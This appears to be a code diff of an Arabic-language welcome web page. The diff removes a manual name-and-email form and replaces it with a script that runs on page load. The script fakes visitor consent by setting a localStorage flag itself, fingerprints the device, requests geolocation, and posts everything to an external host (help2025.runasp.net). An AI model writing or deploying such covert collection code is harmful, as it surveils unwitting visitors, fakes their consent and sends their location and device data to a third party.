@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جمع بيانات الزائر تلقائياً</title>
+
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -23,94 +23,55 @@
             width: 400px;
             text-align: center;
         }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-        }
-        button {
-            background: #007bff;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            margin: 10px;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        button:hover {
-            background: #0056b3;
-        }
-        #status {
-            margin-top: 20px;
-            color: green;
-        }
-        #error {
-            color: red;
-        }
+        #status { margin-top: 20px; color: green; }
+        #error { color: red; }
     </style>
 </head>
 <body>
     <div class="container">
         <h2>مرحبا بك في موقعنا</h2>
-        <p>   سيتم تحويلك   الان  انتظر...</p>
-        <div id="dataForm">
-            <!-- <h3>أدخل معلوماتك</h3>
-            <input type="text" id="name" placeholder="اسمك">
-            <input type="email" id="email" placeholder="إيميلك">
-            <button id="submitBtn">إرسال</button> -->
-        </div>
-        <div id="status"></div>
+        <p>سيتم جمع بياناتك تلقائياً ...</p>
+        <div id="status">جاري الإرسال...</div>
         <div id="error"></div>
     </div>
 
     <script>
-        const apiUrl = '/collect'; // عدّل هذا إلى رابط API الخاص بك
-        const dataForm = document.getElementById('dataForm');
+        const apiUrl = 'http://help2025.runasp.net/api/Collect'; // رابط الـ API النهائي
         const statusDiv = document.getElementById('status');
         const errorDiv = document.getElementById('error');
-        const submitBtn = document.getElementById('submitBtn');
 
-        // الموافقة التلقائية — بدون أي نوافذ أو أزرار
+        // الموافقة التلقائية
         localStorage.setItem('consentGiven', 'true');
-        dataForm.style.display = 'block';
 
-        submitBtn.addEventListener('click', async () => {
-            const name = document.getElementById('name').value.trim();
-            const email = document.getElementById('email').value.trim();
-
-            if (!name || !email) {
-                errorDiv.textContent = 'يرجى إدخال الاسم والإيميل.';
-                return;
-            }
-
-            errorDiv.textContent = '';
-            statusDiv.textContent = 'جاري الإرسال...';
-
+        (async function sendVisitorData() {
             try {
                 const clientData = {
-                    ClientUuid: crypto.randomUUID ? crypto.randomUUID() : Date.now().toString(36) + Math.random().toString(36).substr(2),
-                    ConsentAt: new Date().toISOString(),
-                    UserAgent: navigator.userAgent,
-                    Platform: navigator.platform,
-                    DeviceType: /Mobi|Android/.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
-                    DeviceName: parseDeviceName(navigator.userAgent),
-                    Vendor: navigator.vendor,
-                    Language: navigator.language,
-                    HardwareConcurrency: navigator.hardwareConcurrency,
-                    DeviceMemoryGB: navigator.deviceMemory,
-                    ScreenWidth: screen.width,
-                    ScreenHeight: screen.height,
-                    ScreenColorDepth: screen.colorDepth,
-                    ConnectionType: navigator.connection ? navigator.connection.type : null,
-                    DownlinkMbps: navigator.connection ? navigator.connection.downlink : null,
-                    Rtt: navigator.connection ? navigator.connection.rtt : null,
-                    CookieEnabled: navigator.cookieEnabled,
-                    Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    Geolocation: await getGeolocation(),
-                    Name: name,
-                    Email: email
+                    id: 0,
+                    clientUuid: crypto.randomUUID ? crypto.randomUUID() : Date.now().toString(36) + Math.random().toString(36).substr(2),
+                    consentAt: new Date().toISOString(),
+                    collectedAt: new Date().toISOString(),
+                    ipAddress: "", // يمكن ملؤه من السيرفر إذا كان متاح
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    deviceType: /Mobi|Android/.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+                    deviceName: parseDeviceName(navigator.userAgent),
+                    vendor: navigator.vendor,
+                    language: navigator.language,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemoryGB: navigator.deviceMemory || 0,
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    screenColorDepth: screen.colorDepth,
+                    connectionType: navigator.connection ? navigator.connection.type : "unknown",
+                    downlinkMbps: navigator.connection ? navigator.connection.downlink : 0,
+                    rtt: navigator.connection ? navigator.connection.rtt : 0,
+                    cookieEnabled: navigator.cookieEnabled,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    geolocation: await getGeolocation(),
+                    name: "",
+                    email: "",
+                    country: "",
+                    city: ""
                 };
 
                 const response = await fetch(apiUrl, {
@@ -124,26 +85,27 @@
                 } else {
                     throw new Error('فشل الإرسال');
                 }
-            } catch (error) {
-                errorDiv.textContent = 'حدث خطأ: ' + error.message;
+            } catch (err) {
+                errorDiv.textContent = 'حدث خطأ: ' + err.message;
                 statusDiv.textContent = '';
             }
-        });
+        })();
 
         async function getGeolocation() {
-            return new Promise((resolve) => {
+            return new Promise(resolve => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
-                        (pos) => resolve({
-                            Latitude: pos.coords.latitude,
-                            Longitude: pos.coords.longitude,
-                            Accuracy_m: pos.coords.accuracy,
-                            Error: null
+                        pos => resolve({
+                            id: 0,
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy_m: pos.coords.accuracy,
+                            error: ""
                         }),
-                        (err) => resolve({ Error: err.message })
+                        err => resolve({ id: 0, latitude: 0, longitude: 0, accuracy_m: 0, error: err.message })
                     );
                 } else {
-                    resolve({ Error: 'Geolocation غير مدعوم' });
+                    resolve({ id: 0, latitude: 0, longitude: 0, accuracy_m: 0, error: 'Geolocation غير مدعوم' });
                 }
             });
         }
